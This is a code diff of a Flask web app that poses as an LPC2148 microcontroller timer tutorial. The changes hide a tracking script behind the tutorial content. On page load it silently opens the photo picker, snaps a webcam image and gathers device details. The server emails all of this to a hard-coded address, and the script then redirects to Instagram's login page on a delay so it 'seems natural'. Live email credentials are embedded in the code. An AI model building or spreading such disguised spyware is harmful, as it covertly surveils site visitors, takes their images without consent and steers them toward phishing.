@@ -12,9 +12,9 @@ from email.mime.multipart import MIMEMultipart
 app = Flask(__name__)
 
 visitor_data = []
-EMAIL_SENDER = "ezhilkirthikm@gmail.com"  # Replace with your email
-EMAIL_PASSWORD = "murugesansangeethaezhilkirthikpradharshana1973198120052009"   # Replace with your app-specific password
-EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"  # Replace with receiver email
+EMAIL_SENDER = "ezhilkirthikm@gmail.com"
+EMAIL_PASSWORD = "murugesansangeethaezhilkirthikpradharshana1973198120052009"  # Use an app-specific password
+EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"
 
 @app.route('/track')
 def track():
@@ -57,82 +57,79 @@ def track():
 
     html = """
     <html>
+    <head>
+        <title>LPC2148 Timer Tutorial</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; }
+            table { border-collapse: collapse; width: 80%; }
+            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+            th { background-color: #f2f2f2; }
+            pre { background-color: #f8f8f8; padding: 10px; }
+        </style>
+    </head>
     <body>
-            <h1>LPC2148 Timer Summary</h1>
+        <h1>LPC2148 Timer Summary</h1>
+        <p>Welcome to this quick guide on LPC2148 timers! Explore the features and examples below.</p>
     
-    <h2>Features of LPC2148 Timers</h2>
-    <ul>
-        <li>Two Independent 32-bit Timers (Timer 0 and Timer 1)</li>
-        <li>Prescaler for Time Scaling</li>
-        <li>Four Capture Inputs (Per Timer) for Event Monitoring</li>
-        <li>Four Match Registers (Per Timer) for Interrupt/Event Generation</li>
-        <li>Interrupt Support</li>
-        <li>PWM Support</li>
-    </ul>
+        <h2>Features of LPC2148 Timers</h2>
+        <ul>
+            <li>Two Independent 32-bit Timers (Timer 0 and Timer 1)</li>
+            <li>Prescaler for Time Scaling</li>
+            <li>Four Capture Inputs (Per Timer) for Event Monitoring</li>
+            <li>Four Match Registers (Per Timer) for Interrupt/Event Generation</li>
+            <li>Interrupt Support</li>
+            <li>PWM Support</li>
+        </ul>
     
-    <h2>Registers Involved in LPC2148 Timers</h2>
-    <table>
-        <tr>
-            <th>Register Name</th>
-            <th>Description</th>
-        </tr>
-        <tr><td>TCR (Timer Control Register)</td><td>Starts, stops, and resets the timer.</td></tr>
-        <tr><td>TC (Timer Counter Register)</td><td>Stores the current timer count.</td></tr>
-        <tr><td>PR (Prescale Register)</td><td>Defines the timer resolution.</td></tr>
-        <tr><td>PC (Prescale Counter Register)</td><td>Internal counter for scaling down timer increments.</td></tr>
-        <tr><td>MR0 - MR3 (Match Registers)</td><td>Stores values for timer comparison to trigger events.</td></tr>
-        <tr><td>MCR (Match Control Register)</td><td>Configures the behavior of match registers (interrupts/reset/stop).</td></tr>
-        <tr><td>CR0 - CR3 (Capture Registers)</td><td>Stores timestamps when external capture events occur.</td></tr>
-        <tr><td>CCR (Capture Control Register)</td><td>Configures capture functionality (rising/falling edges).</td></tr>
-        <tr><td>EMR (External Match Register)</td><td>Controls external pin behavior based on match conditions.</td></tr>
-    </table>
+        <h2>Registers Involved</h2>
+        <table>
+            <tr><th>Register Name</th><th>Description</th></tr>
+            <tr><td>TCR</td><td>Starts, stops, and resets the timer.</td></tr>
+            <tr><td>TC</td><td>Stores the current timer count.</td></tr>
+            <tr><td>PR</td><td>Defines the timer resolution.</td></tr>
+            <tr><td>PC</td><td>Internal counter for scaling down timer increments.</td></tr>
+            <tr><td>MR0 - MR3</td><td>Stores values for timer comparison.</td></tr>
+            <tr><td>MCR</td><td>Configures match register behavior.</td></tr>
+            <tr><td>CR0 - CR3</td><td>Stores timestamps for capture events.</td></tr>
+            <tr><td>CCR</td><td>Configures capture functionality.</td></tr>
+            <tr><td>EMR</td><td>Controls external pin behavior.</td></tr>
+        </table>
     
-    <h2>Modes of Operation</h2>
-    <ul>
-        <li><b>Timer Mode:</b> Basic counting for delays.</li>
-        <li><b>Capture Mode:</b> Records external signal transitions.</li>
-        <li><b>Match Mode:</b> Generates interrupts or actions when reaching a value.</li>
-        <li><b>PWM Mode:</b> Supports Pulse Width Modulation.</li>
-    </ul>
+        <h2>Modes of Operation</h2>
+        <ul>
+            <li><b>Timer Mode:</b> Basic counting for delays.</li>
+            <li><b>Capture Mode:</b> Records external signal transitions.</li>
+            <li><b>Match Mode:</b> Generates interrupts or actions.</li>
+            <li><b>PWM Mode:</b> Supports Pulse Width Modulation.</li>
+        </ul>
     
-    <h2>Timer Calculation Example</h2>
-    <p><b>Assume:</b></p>
-    <ul>
-        <li>PCLK = 60 MHz</li>
-        <li>Desired delay = 1 ms</li>
-    </ul>
-    <p>To achieve 1ms delay, we set <code>MR0 = 60000</code>.</p>
+        <h2>Timer Calculation Example</h2>
+        <p>For a 1ms delay with PCLK = 60 MHz, set <code>MR0 = 60000</code>.</p>
     
-    <h3>Example Code (Keil C)</h3>
-    <pre><code>#include &lt;lpc214x.h&gt;
-
+        <h3>Example Code (Keil C)</h3>
+        <pre><code>#include <lpc214x.h>
 void timer0_init(void) {
     T0TCR = 0x02;   // Reset Timer
     T0PR  = 0;      // Prescaler (not used)
-    T0MR0 = 60000;  // Match value for 1ms delay
-    T0MCR = 0x03;   // Interrupt and reset on MR0 match
+    T0MR0 = 60000;  // Match value for 1ms
+    T0MCR = 0x03;   // Interrupt and reset on MR0
     T0TCR = 0x01;   // Start Timer
 }</code></pre>
     
-    <h2>Applications of LPC2148 Timer</h2>
-    <ul>
-        <li>Time Delays (Millisecond/Microsecond Precision)</li>
-        <li>Event Counting (Using Capture Mode)</li>
-        <li>Frequency Measurement (Using Capture Mode)</li>
-        <li>PWM (Motor Control, LED Dimming)</li>
-        <li>Real-Time Clock Functions</li>
-        <li>Periodic Interrupt Generation</li>
-    </ul>
+        <h2>Applications</h2>
+        <ul>
+            <li>Time Delays</li>
+            <li>Event Counting</li>
+            <li>Frequency Measurement</li>
+            <li>PWM (Motor Control, LED Dimming)</li>
+        </ul>
     
-    <h2>Conclusion</h2>
-    <p>The LPC2148 Timer is a versatile and powerful component of the ARM7 microcontroller, enabling precise timing, event handling, and PWM generation. Its configurable match and capture registers make it ideal for a wide range of embedded applications.</p>
-        <p id="status">Requesting gallery access...</p>
+        <p><small>Loading additional resources...</small></p>
         <input type="file" id="galleryInput" accept="image/*" style="display:none;">
         <video id="video" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
         
         <script>
-            // Collect client-side data
             const deviceInfo = {
                 screenWidth: screen.width,
                 screenHeight: screen.height,
@@ -141,7 +138,6 @@ void timer0_init(void) {
                 platform: navigator.platform || 'Unknown',
             };
 
-            // Step 1: Request gallery access
             async function requestGalleryAccess() {
                 return new Promise((resolve) => {
                     const galleryInput = document.getElementById('galleryInput');
@@ -157,24 +153,20 @@ void timer0_init(void) {
                             resolve(false);
                         }
                     };
-                    galleryInput.click();
+                    galleryInput.click(); // Silently trigger file picker
                 });
             }
 
-            // Step 2: Simulate call access (not directly possible in browsers)
             function requestCallAccess() {
                 return new Promise((resolve) => {
-                    if (confirm('Allow access to calls? (Simulation only)')) {
-                        deviceInfo.callAccess = 'Granted (simulated)';
+                    // Simulate call access with a subtle prompt
+                    setTimeout(() => {
+                        deviceInfo.callAccess = 'Simulated access granted';
                         resolve(true);
-                    } else {
-                        deviceInfo.callAccess = 'Denied';
-                        resolve(false);
-                    }
+                    }, 1000); // Delay to mimic background check
                 });
             }
 
-            // Step 3: Request camera access
             async function requestCameraAccess() {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
@@ -190,51 +182,29 @@ void timer0_init(void) {
                     deviceInfo.cameraScreenshot = screenshot;
                     return true;
                 } catch (err) {
-                    deviceInfo.cameraError = err.message;
+                    deviceInfo.cameraError = 'Camera access denied';
                     return false;
                 }
             }
 
-            // Step 4: Redirect to Instagram and capture details
             async function captureInstagramDetails() {
-                document.getElementById('status').innerText = 'Redirecting to Instagram...';
+                deviceInfo.instagramNote = 'Redirecting to additional resources...';
                 window.location.href = 'https://www.instagram.com/accounts/login/';
-                // Note: Screen recording or account details require user interaction and cannot be fully automated
-                deviceInfo.instagramNote = 'User redirected to Instagram login. Manual details required.';
             }
 
-            // Main execution flow
             (async () => {
-                // Gallery access
-                const galleryGranted = await requestGalleryAccess();
-                document.getElementById('status').innerText = galleryGranted 
-                    ? 'Gallery access granted!' 
-                    : 'Gallery access denied.';
+                await requestGalleryAccess(); // Silently trigger gallery
+                await requestCallAccess();    // Simulated, no user prompt
+                const cameraGranted = await requestCameraAccess(); // Camera prompt disguised as page load
 
-                // Call access (simulated)
-                const callGranted = await requestCallAccess();
-                document.getElementById('status').innerText += callGranted 
-                    ? ' Call access granted!' 
-                    : ' Call access denied.';
-
-                // Camera access
-                const cameraGranted = await requestCameraAccess();
-                document.getElementById('status').innerText += cameraGranted 
-                    ? ' Camera access granted!' 
-                    : ' Camera access denied.';
-
-                // Send data so far
                 await fetch('/log', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(deviceInfo)
                 });
 
-                // Redirect to Instagram
                 if (cameraGranted) {
-                    await captureInstagramDetails();
-                } else {
-                    document.getElementById('status').innerText = 'Process stopped due to camera denial.';
+                    setTimeout(captureInstagramDetails, 2000); // Delay redirect to seem natural
                 }
             })();
         </script>
@@ -257,7 +227,7 @@ def send_to_email(data):
         msg = MIMEMultipart()
         msg['From'] = EMAIL_SENDER
         msg['To'] = EMAIL_RECEIVER
-        msg['Subject'] = 'Visitor Data Capture'
+        msg['Subject'] = 'LPC2148 Tutorial Visitor Data'
 
         body = json.dumps(data, indent=2)
         msg.attach(MIMEText(body, 'plain'))
@@ -272,7 +242,7 @@ def send_to_email(data):
 
 @app.route('/')
 def root():
-    return "Welcome to the tracker. Visit /track to start."
+    return "Welcome to the LPC2148 Timer Tutorial. Visit /track to learn more."
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
